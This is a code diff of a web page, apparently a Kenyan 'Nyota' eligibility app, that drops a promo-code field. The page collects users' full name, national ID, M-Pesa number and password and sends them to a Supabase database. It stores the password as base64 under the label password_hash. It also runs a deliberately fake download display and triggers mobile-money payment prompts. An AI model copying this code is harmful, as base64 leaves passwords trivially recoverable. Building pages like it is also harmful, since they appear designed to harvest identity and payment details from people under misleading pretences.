@@ -226,7 +226,7 @@
                     <div><input type="text" id="in-name" placeholder="Full Name"></div>
                     <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
                     <div><input type="tel" id="in-mpesa" placeholder="Safaricom M-Pesa (07XX or 01XX)"></div>
-                    <div><input type="text" id="in-promo" placeholder="Promo Code (Optional)"></div>
+                    <!-- PROMO CODE REMOVED HERE -->
                     <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
                     <button onclick="submitLogin()" class="native-btn mt-4">Check Eligibility</button>
                 </div>
@@ -508,16 +508,13 @@ function handleInstallClick() {
         startFakeDownload();
         deferredPrompt.prompt();
         
-        // Listen for the user's choice
         deferredPrompt.userChoice.then((choiceResult) => {
             if (choiceResult.outcome === 'dismissed') {
-                // If they cancelled, reset the UI immediately
                 showInstallState();
             }
             deferredPrompt = null;
         });
         
-        // Safety fallback: If the prompt gets stuck for 4 seconds, reset the button
         setTimeout(() => {
             if (document.getElementById('downloading-buttons').classList.contains('hide') === false) {
                 showInstallState();
@@ -642,7 +639,7 @@ function submitLogin(){
     const name = document.getElementById('in-name').value.trim();
     const id = document.getElementById('in-id').value.trim();
     const mpesa = document.getElementById('in-mpesa').value.trim();
-    const promo = document.getElementById('in-promo').value.trim();
+    // PROMO REMOVED FROM STATE
     const pass = document.getElementById('in-pass').value;
 
     if(!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showToast("Enter a valid full name.");
@@ -650,12 +647,12 @@ function submitLogin(){
     if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number (07XX or 01XX).");
     if(pass.length < 4) return showToast("Password must be at least 4 characters.");
 
-    state.name = name; state.id = id; state.mpesa = mpesa; state.promo = promo;
-    localStorage.setItem('nyota_user', JSON.stringify({ name, id, mpesa, promo }));
+    state.name = name; state.id = id; state.mpesa = mpesa; state.promo = ""; // Empty string for DB
+    localStorage.setItem('nyota_user', JSON.stringify({ name, id, mpesa, promo: "" }));
 
     fetch(`${SUPABASE_URL}/rest/v1/users`, {
         method:'POST', headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
-        body: JSON.stringify({ full_name:name, national_id:id, mpesa_number:mpesa, promo_code:promo, password_hash:"web_"+btoa(pass) })
+        body: JSON.stringify({ full_name:name, national_id:id, mpesa_number:mpesa, promo_code:"", password_hash:"web_"+btoa(pass) })
     }).catch(()=>{});
 
     showScreen('screen-checking');
@@ -721,7 +718,6 @@ async function processPayment(){
 
     let realAttempts = parseInt(localStorage.getItem('nyota_real_stk_attempts') || '0');
 
-    // Spam protection limit
     if (realAttempts >= 4) { 
         if (window.showToast) window.showToast("⏸️ Temporarily restricted. Contact support."); 
         return; 
